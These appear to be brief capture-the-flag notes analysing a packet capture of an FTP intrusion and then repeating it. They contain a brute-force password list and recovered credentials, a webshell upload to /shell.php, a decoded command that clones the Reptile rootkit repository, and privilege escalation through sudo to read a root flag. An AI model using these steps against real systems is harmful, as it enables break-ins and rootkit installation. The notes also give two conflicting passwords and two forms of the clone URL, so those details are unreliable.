pcap:
 
ftp login  
user jenny  
uploaded webshell at /shell.php  
ftp login successful: danny, iloveyou, jessica, letmein, shadow, michael, monkey, 1qaz2wsx, password123, internet, superman, computer, 1234567890, 000000, football
 
jenny:password123
 
0000 08 00 27 92 a2 af 00 0c 29 4a b9 cd 08 00 45 00 ..'.....)J....E.  
0010 00 67 be a8 40 00 40 06 f9 91 c0 a8 00 93 c0 a8 .g..@.@.........  
0020 00 73 00 50 d1 e6 62 3c be b4 ef 15 62 b1 80 18 .s.P..b<....b...  
0030 01 f5 82 b0 00 00 01 01 08 0a 53 ea 1e 0b 65 72 ..........S...er  
0040 54 6f 67 69 74 20 63 6c 6f 6e 65 20 68 74 74 70 Togit clone http  
0050 73 3a 2f 2f 67 69 74 68 75 62 2e 63 6f 6d 2f 66 s://github.com/f  
0060 30 72 62 31 64 64 33 6e 2f 52 65 70 74 69 6c 65 0rb1dd3n/Reptile  
0070 2e 67 69 74 0a .git.
 
git clone [https://github.com/fn/Reptile.git](https://github.com/fn/Reptile.git)
 
Attacking:  
hydra ftp  
jenny:987654321  
ftp  
upload shell  
go to website IP/shell.php  
su jenny  
sudo -l  
sudo su  
/root/reptile/flag.txt